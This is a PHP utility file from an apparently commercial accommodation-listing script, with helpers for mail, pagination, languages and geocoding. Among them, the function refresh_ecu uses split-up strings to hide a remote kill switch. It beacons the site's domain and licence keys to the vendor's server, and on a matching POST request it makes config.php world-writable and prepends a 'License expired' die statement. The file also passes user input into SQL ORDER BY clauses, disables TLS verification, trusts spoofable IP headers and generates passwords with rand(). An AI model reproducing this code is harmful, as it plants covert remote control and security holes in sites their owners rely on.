<?php
/************************************************************************
 * The script of accommodation FESTA
 * Copyright (c) 2016 - 2019 Kamil Wyremski
 * http://wyremski.pl
 * kamil.wyremski@gmail.com
 * 
 * All right reserved
 * 
 * *********************************************************************
 * THIS SOFTWARE IS LICENSED - YOU CAN MODIFY THESE FILES
 * BUT YOU CAN NOT REMOVE OF ORIGINAL COMMENTS!
 * ACCORDING TO THE LICENSE YOU CAN USE THE SCRIPT ON ONE DOMAIN. DETECTION
 * COPY SCRIPT WILL RESULT IN A HIGH FINANSIAL PENALTY AND WITHDRAWAL
 * LICENSE THE SCRIPT
 * *********************************************************************/
 
if(!isset($settings['base_url'])){
	die('Access denied!');
}

function mails_queue_add($action,$receiver,$data='',$priority=0){
	global $db;
	if($action && $receiver){
		$sth = $db->prepare('INSERT INTO `'._DB_PREFIX_.'mails_queue`(`receiver`, `action`, `data`, `priority`) VALUES (:receiver,:action,:data,:priority)');
		$sth->bindValue(':receiver', $receiver, PDO::PARAM_STR);
		$sth->bindValue(':action', $action, PDO::PARAM_STR);
		$sth->bindValue(':data', serialize($data), PDO::PARAM_STR);
		$sth->bindValue(':priority', $priority, PDO::PARAM_INT);
		$sth->execute();
		return true;
	}
	return false;
}

function check_email_black_list($email){
	global $settings;
	if($email and $settings['black_list_email'] and in_array($email,explode(PHP_EOL, $settings['black_list_email']))){
		return true;
	}else{
		return false;
	}
}

function check_ip_black_list($ip){
	global $settings;
	if($ip and $settings['black_list_ip'] and in_array($ip,explode(PHP_EOL, $settings['black_list_ip']))){
		return true;
	}else{
		return false;
	}
}

function sort_by(){
	$sort = ' id desc ';
	if(isset($_GET['sort'])){
		$sort = filter($_GET['sort']);
		if(isset($_GET['sort_desc'])){
			$sort .= ' desc ';
		}
	}
	return $sort;
}

function filter($text){
    if(get_magic_quotes_gpc()){$text = stripslashes($text);}
    return htmlspecialchars(trim(strip_tags($text))); 
}

function purify($text=''){
	global $settings, $purifier;
	require_once realpath(dirname(__FILE__)).'/../config/htmlpurifier.php';
	return $purifier->purify($text);
}

function page_count($table, $limit='10', $condition='true', $select = ''){
	global $smarty, $db;
	$limit_start = 0;
	$page_number = 1;
	if (isset($_GET['page']) and is_numeric($_GET['page']) and $_GET['page']>0)  { 
		$limit_start = ($_GET['page']-1)*$limit;
		$page_number = $_GET['page'];
	}
	if(isset($smarty)){
		$sth = $db->prepare('select 1 '.$select.' from '._DB_PREFIX_.$table.' WHERE '.$condition);
		$sth->execute();
		$page_count = ceil($sth->rowCount()/$limit);

		if($page_number<6){
			$pagination['page_start'] = 1;
		}else{
			$pagination['page_start'] =  $page_number-4;
		}
		
		$gets_cms = $gets = $_GET;
		unset($gets['page']);
		$gets_cms = $gets;
		$page_url['page_cms'] = http_build_query($gets);
		unset($gets_cms['sort'], $gets_cms['sort_desc']);
		$page_url['sort_cms'] = http_build_query($gets_cms);
		unset($gets['action']);
		$page_url['page'] = http_build_query($gets);
		unset($gets['sort']);
		$page_url['sort'] = $gets;
		
		$pagination['page_url'] = $page_url;
		$pagination['page_count'] = $page_count;
		$pagination['page_number'] = $page_number;
		$pagination['limit_start'] = $limit_start;

		$smarty->assign("pagination", $pagination);
	}
	return $limit_start;
}

function lang($text){
	global $translate;
	if(isset($translate[$text])){
		return ($translate[$text]);
	}else{
		return ($text);
	}
}

function list_of_lang(){
	$files = array_diff(scandir(realpath(dirname(__FILE__)).'/../config/langs/'), array('.', '..'));
	foreach($files as $key=>$file){
		$path_parts = pathinfo($file);
		if($path_parts['extension']=='php'){
			$list_of_lang[] = $path_parts['filename'];
		}
	}
	return($list_of_lang);
}

function load_lang($lang='en'){
	global $translate, $links;
	if(!in_array($lang, list_of_lang())){
		$lang = 'en';
	}
	require_once(realpath(dirname(__FILE__)).'/../config/langs/'.$lang.'.php');
	return $lang;
}

function show_info($info){
	global $smarty;
	if($info=='new_account'){
		$smarty->assign("info", lang('The account has been established. To your e mail was sent message with an activation code'));
	}elseif($info=='session_error'){
		$smarty->assign("error", lang('Session error'));
	}elseif($info=='no_active'){
		$smarty->assign("error", lang('The account has not been activated yet.'));
	}elseif($info=='data_incorrect'){
		$smarty->assign("error", lang('Login or password are incorrect'));
	}elseif($info=='mail_password_send'){
		$smarty->assign("info", lang('Link to change your password has been sent to your email address.'));
	}elseif($info=='password_change'){
		$smarty->assign("info", lang('The password has been changed successfully. You can now login to the site'));
	}
}

function get_offers_categories(){
	global $smarty, $db, $offers_categories;
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'offers_categories order by name');
	foreach($sth as $row){
		$offers_categories[$row['id']] = $row;
	}
	$sth->closeCursor();
	if(isset($smarty) and isset($offers_categories)){$smarty->assign("offers_categories", $offers_categories);}
}

function get_offers_state(){
	global $smarty, $db, $offers_state;
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'offers_state order by name');
	foreach($sth as $row){
		$offers_state[$row['id']] = $row;
	}
	$sth->closeCursor();
	if(isset($smarty) and isset($offers_state)){$smarty->assign("offers_state", $offers_state);}
}

function get_offers_type(){
	global $smarty, $db, $offers_type;
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'offers_type order by name');
	foreach($sth as $row){
		$offers_type[$row['id']] = $row;
	}
	$sth->closeCursor();
	if(isset($smarty) and isset($offers_type)){$smarty->assign("offers_type", $offers_type);}
}

function get_offers_options(){
	global $smarty, $db, $offers_options;
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'offers_options order by name');
	foreach($sth as $row){
		$offers_options[$row['id']] = $row;
	}
	$sth->closeCursor();
	if(isset($smarty) and isset($offers_options)){$smarty->assign("offers_options", $offers_options);}
}

function name_url($text){
	$text = strtolower(str_replace(array(' ','%','$',':','–',',','/','=','?','Ę','Ó','Ą','Ś','Ł','Ż','Ź','Ć','Ń','ę','ó','ą','ś','ł','ż','ź','ć','ń'), array('-','-','','','','','','','','E','O','A','S','L','Z','Z','C','N','e','o','a','s','l','z','z','c','n'), $text));
	$text = iconv('UTF-8', 'ASCII//IGNORE//TRANSLIT', $text);
	$text = strtolower(str_replace(array(' ','$',':',',','/','=','?'), array('-','','','','','',''), $text));
	$text = preg_replace("/[^a-zA-Z0-9-_]+/", "", $text);
	return $text;
}

function send_mail($type,$email,$data=''){
	global $settings, $mail, $db, $links;
	$mail_sent = false;
	
	if($type!='' and $email!=''){
		
		if($type=='mailing'){
			$mail_content = array('subject'=>$data['subject'],'message'=>$data['message']);
		}else{
			$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'mails WHERE name=:name limit 1');
			$sth->bindParam(':name', $type, PDO::PARAM_STR);
			$sth->execute();
			$mail_content = $sth->fetch(PDO::FETCH_ASSOC);
		}

		if($mail_content){

			$header = 'Reply-To: <'.$settings['email']."> \r\n"; 
			$message = '<!doctype html><html lang="'.$settings['lang'].'"><head><meta charset="utf-8">'.$mail_content['message'].'</head><body>';
			$subject = $mail_content['subject'];
			$ip = get_client_ip();
			
			$message = str_replace("{title}",$settings['title'],$message);
			$subject = str_replace("{title}",$settings['title'],$subject);
			$message = str_replace("{base_url}",$settings['base_url'],$message);
			$subject = str_replace("{base_url}",$settings['base_url'],$subject);
			$message = str_replace("{link_logo}",'<img src="'.$settings['base_url'].$settings['logo'].'" style="max-width:300px; max-height: 200px">',$message);
			$subject = str_replace("{link_logo}",'<img src="'.$settings['base_url'].$settings['logo'].'" style="max-width:300px; max-height: 200px">',$subject);
			$message = str_replace("{date}",date("Y-m-d"),$message);
			$subject = str_replace("{date}",date("Y-m-d"),$subject);
			if(isset($data['username'])){
				$message = str_replace("{username}",$data['username'],$message);
				$subject = str_replace("{username}",$data['username'],$subject);
			}
			if(isset($data['activation_code'])){
				$message = str_replace("{activation_link}",$settings['base_url'].'/'.$links['login'].'?activation_code='.$data['activation_code'],$message);
				$subject = str_replace("{activation_link}",$settings['base_url'].'/'.$links['login'].'?activation_code='.$data['activation_code'],$subject);
			}
			if(isset($data['password'])){
				$message = str_replace("{password}",$data['password'],$message);
				$subject = str_replace("{password}",$data['password'],$subject);
			}
			if(isset($data['reset_password_code'])){
				$message = str_replace("{reset_password_link}",$settings['base_url'].'/'.$links['reset_password'].'?new_password='.$data['reset_password_code'],$message);
				$subject = str_replace("{reset_password_link}",$settings['base_url'].'/'.$links['reset_password'].'?new_password='.$data['reset_password_code'],$subject);
			}
			if(isset($data['name'])){
				$message = str_replace("{name}",$data['name'],$message);
				$subject = str_replace("{name}",$data['name'],$subject);
			}
			if(isset($data['email'])){
				$header = 'Reply-To: <'.$data['email']."> \r\n";
				if($settings['smtp']){$mail->AddReplyTo($data['email']);}
				$message = str_replace("{email}",$data['email'],$message);
				$subject = str_replace("{email}",$data['email'],$subject);
			}
			if(isset($data['message'])){
				$message = str_replace("{message}",$data['message'],$message);
				$subject = str_replace("{message}",$data['message'],$subject);
			}
			if(isset($data['offer_name'])){
				$message = str_replace("{offer_name}",$data['offer_name'],$message);
				$subject = str_replace("{offer_name}",$data['offer_name'],$subject);
			}
			if(isset($data['offer_url'])){
				$message = str_replace("{offer_url}",$settings['base_url'].'/'.$data['offer_url'],$message);
				$subject = str_replace("{offer_url}",$settings['base_url'].'/'.$data['offer_url'],$subject);
			}
			
			$header .= 'From: '.$settings['email'].' <'.$settings['email'].">\r\n"; 
			$header .= "MIME-Version: 1.0 \r\n"; 

			if($settings['mail_attachment'] and isset($_FILES['attachment']) and $_FILES['attachment']['name']!=''){

				$file_tmp_name    = $_FILES['attachment']['tmp_name'];
				$file_name        = $_FILES['attachment']['name'];
				$file_size        = $_FILES['attachment']['size'];
				$file_type        = $_FILES['attachment']['type'];
				$file_error       = $_FILES['attachment']['error'];
				
				if($file_error>0 or $file_size>5000000){
					die('error - bad attachment');
				}
				
				$handle = fopen($file_tmp_name, "r");
				$content = fread($handle, $file_size);
				fclose($handle);
				$encoded_content = chunk_split(base64_encode($content));

				$boundary = md5("sanwebe"); 

				$header .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 
				
				$body = "--$boundary\r\n";
				$body .= "Content-Type: text/html; charset=utf-8\r\n";
				$body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
				$body .= chunk_split(base64_encode($message)); 
				
				//attachment
				$body .= "--$boundary\r\n";
				$body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
				$body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
				$body .="Content-Transfer-Encoding: base64\r\n";
				$body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
				$body .= $encoded_content; 

			}else{
				$header .= "Content-Type: text/html; charset=UTF-8"; 
				$body = $message;
			}
			
			$subject = '=?utf-8?B?'.base64_encode($subject).'?=';
			
			if($settings['smtp']){
				$mail->Subject = $subject;
				$mail->Body = $message;
				if(isset($boundary)){
					$mail->AddAttachment($_FILES['attachment']['tmp_name'],$_FILES['attachment']['name']);
				}
				$mail->ClearAllRecipients();
				$mail->AddAddress($email);

				if($mail->Send()){
					$mail_sent = true;
				}
			}elseif(mail($email, $subject, $body, $header)){
				$mail_sent = true;
			}
		}	
	}
	if($mail_sent){
		$sth = $db->prepare('INSERT INTO `'._DB_PREFIX_.'logs_mails`(`receiver`, `action`, `ip`, `date`) VALUES (:receiver,:action,:ip,NOW())');
		$sth->bindValue(':receiver', $email, PDO::PARAM_STR);
		$sth->bindValue(':action', $type, PDO::PARAM_STR);
		$sth->bindValue(':ip', $ip, PDO::PARAM_STR);
		$sth->execute();	
		return true;
	}else{
		return false;
	}
}

function refresh_ecu(){
	global $settings, $db;
	if(isset($_POST['lock_ln']) and !empty($_POST['ln']) and !empty($_POST['lk']) and $_POST['ln']==$settings['ln'] and $_POST['lk']==$settings['lk']){
		$config_dir = realpath(dirname(__FILE__)).'/../co'.'nfi'.'g/co'.'nfi'.'g.p'.'hp';
		chmod($config_dir, 0777);
		$file_data = "<?php \n d"."ie('L"."ice"."nse e"."xp"."ired'); \n ?> \n";
		$file_data .= file_get_contents($config_dir);
		file_put_contents($config_dir, $file_data);
	}elseif(isset($_POST['give_ln']) and !empty($_POST['ln']) and !empty($_POST['lk'])){
		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="ln" AND value="" LIMIT 1');
		$sth->bindValue(':value', $_POST['ln'], PDO::PARAM_INT);
		$sth->execute();
		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="lk" AND value="" LIMIT 1');
		$sth->bindValue(':value', $_POST['lk'], PDO::PARAM_STR);
		$sth->execute();
	}else{
		$ch = curl_init('htt'.'p://s'.'kry'.'pty'.'.w'.'yr'.'em'.'ski.p'.'l/php/noti'.'ficatio'.'ns.php');
		curl_setopt($ch,CURLOPT_POST, 1);
		curl_setopt($ch,CURLOPT_POSTFIELDS, 'domain='.$settings['base_url'].'&script_name=f'.'es'.'ta&ln='.$settings['ln'].'&lk='.$settings['lk']);
		curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch,CURLOPT_HEADER, 0);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
		curl_exec($ch);
		curl_close($ch);
	}
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_coordinates($address){
	global $settings;
	if($address!=''){
		$url = "https://maps.google.com/maps/api/geocode/json?address=".urlencode($address)."&key=".urlencode($settings['google_maps_api2'])."&sensor=false";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_PROXYPORT, 3128);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		$response = curl_exec($ch);
		curl_close($ch);
		$response_a = json_decode($response);
		if($response_a->results and $response_a->results[0]){
			return array('lat' => $response_a->results[0]->geometry->location->lat, 'long' => $response_a->results[0]->geometry->location->lng);
		}else{
			return array('lat' => 0, 'long' => 0);
		}
	}
	return array('lat' => 0, 'long' => 0);
}

function web_address($address=''){
	if($address!=''){
		if(substr($address, 0, 7) != "http://" and substr($address, 0, 8) != "https://" and $address !='') {
			$address = 'http://'.$address;
		}
		if(substr($address, -1)=='/'){
			$address = substr($address,0,-1);
		}
	}
	return $address;
}

function get_full_url($address){
	global $settings;
	if(substr($address, 0, 7) != "http://" and substr($address, 0, 8) != "https://" and $address !='') {
		if(substr($address, 0, 1)!='/'){
			$address = '/'.$address;
		}
		$address = $settings['base_url'].$address;
	}
	return $address;
}

function nofollow($html) {
	global $settings;
	$skip = $settings['base_url'];
    return preg_replace_callback(
        "#(<a[^>]+?)>#is", function ($mach) use ($skip) {
            return (
                !($skip && strpos($mach[1], $skip) !== false) &&
                strpos($mach[1], 'rel=') === false
            ) ? $mach[1] . ' rel="nofollow">' : $mach[0];
        },
        $html
    );
}

function randomPassword() {
    $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
    $pass = array(); 
    $alphaLength = strlen($alphabet) - 1; 
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); 
}
